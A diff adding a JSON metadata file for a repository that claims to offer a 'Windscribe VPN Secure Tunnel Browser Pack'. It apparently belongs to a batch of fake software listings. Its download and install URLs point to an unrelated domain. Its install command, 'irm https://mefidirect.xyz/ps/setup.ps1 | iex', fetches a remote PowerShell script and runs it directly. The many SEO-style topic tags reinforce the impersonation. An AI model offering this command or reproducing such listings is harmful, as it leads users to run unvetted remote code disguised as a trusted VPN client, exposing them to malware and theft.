@@ -1,0 +1,29 @@
+{
+  "repo": "windscribe-vpn-secure-tunnel-browser-pack",
+  "product": "Windscribe VPN Secure Tunnel Browser Pack",
+  "kind": "vpn",
+  "install_type": "download",
+  "download_url": "https://windscribe.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "vpn",
+  "topics": [
+    "windscribe-official",
+    "windscribe-desktop-edition",
+    "windscribe-vpn-client",
+    "windscribe-for-pc",
+    "windscribe-troubleshooting",
+    "windscribe-install-wizard",
+    "windscribe-secure-vpn",
+    "windscribe-windows-client",
+    "windscribe-setup-walkthrough",
+    "windscribe-walkthrough-2026",
+    "windscribe-release-build",
+    "network-tools",
+    "windows-tools",
+    "privacy-tools",
+    "pc-utility"
+  ]
+}
